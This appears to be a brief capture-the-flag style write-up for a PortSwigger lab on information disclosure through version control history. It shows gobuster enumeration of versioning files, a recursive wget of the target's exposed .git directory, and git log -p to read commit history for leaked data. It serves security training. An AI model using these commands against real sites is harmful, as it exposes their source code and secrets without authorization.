# Information disclosure in version control history

[Lab](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history)

## Recognition

```bash
export TARGET=https://ac021f0d1ecba418c02c20fc00bb00e1.web-security-academy.net 
```

```bash
gobuster -e -u $TARGET -w /opt/SecLists/Discovery/Web-Content/versioning_metafiles.txt
```

```bash
wget -r --no-parent https://ac021f0d1ecba418c02c20fc00bb00e1.web-security-academy.net/.git
```

```bash
git log -p
```